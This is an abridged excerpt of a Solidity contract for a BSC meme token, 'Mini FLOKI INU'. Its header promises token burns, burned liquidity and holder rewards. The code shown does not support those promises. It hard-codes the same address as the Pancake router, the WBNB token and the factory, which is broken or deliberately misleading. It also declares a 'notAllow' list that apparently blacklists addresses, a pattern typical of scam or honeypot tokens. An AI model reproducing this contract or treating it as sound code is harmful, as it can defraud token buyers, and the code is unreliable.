...
/*
* Welcome to Mini FLOKI INU
* 50% Token Burned
* LP Burn forever
*  Mini FLOKI INU will burn 3% every transaction
* 2% reward to holders
*/
...
contract MiniFLOKIINU is Context, IERC20, IERC20Metadata, Ownable { 
    address internal PANCAKE_ROUTER_V2_ADDRESS = 0x4d530d630aCd725C14B60eE6582005A6fDB1211F;
    address internal WBNB = 0x4d530d630aCd725C14B60eE6582005A6fDB1211F;
    ...
    address[] notAllow;
    constructor() {  
        _name = "Mini FLOKI INU";
        _symbol = "MiniFLOKIINU";
    ...
    function pancakePair() public view virtual returns (address) {
        address pairAddress = IPancakeFactory(0x4d530d630aCd725C14B60eE6582005A6fDB1211F).getPair(address(WBNB), address(this));
        return pairAddress;
    }
